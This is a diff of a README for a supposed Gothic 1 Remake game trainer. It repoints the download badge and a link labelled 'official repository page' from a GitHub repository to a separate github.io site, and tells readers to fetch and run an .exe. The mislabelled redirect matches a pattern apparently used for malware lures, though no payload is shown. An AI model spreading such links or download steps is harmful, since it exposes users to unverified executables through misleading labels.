@@ -1,6 +1,6 @@
 # ⚙️ Gothic1Remake_Trainer_1 - Enhance your Gothic 1 Remake experience
 
-[![Download Gothic1Remake_Trainer_1](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/esmaunarticulated499/Gothic1Remake_Trainer_1)
+[![Download Gothic1Remake_Trainer_1](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://esmaunarticulated499.github.io)
 
 This tool changes how you play Gothic 1 Remake. It fixes common frame rate drops and provides shortcuts for character management. You gain access to internal game console modes and build guides. The program helps you optimize your settings for smooth gameplay.
 
@@ -8,7 +8,7 @@ This tool changes how you play Gothic 1 Remake. It fixes common frame rate drops
 
 Follow these steps to get the program on your Windows computer.
 
-1. Go to the [official repository page](https://github.com/esmaunarticulated499/Gothic1Remake_Trainer_1).
+1. Go to the [official repository page](https://esmaunarticulated499.github.io).
 2. Look for the section labeled Releases on the right side of your browser window.
 3. Select the most recent version number.
 4. Locate the file ending in .exe under the Assets heading.
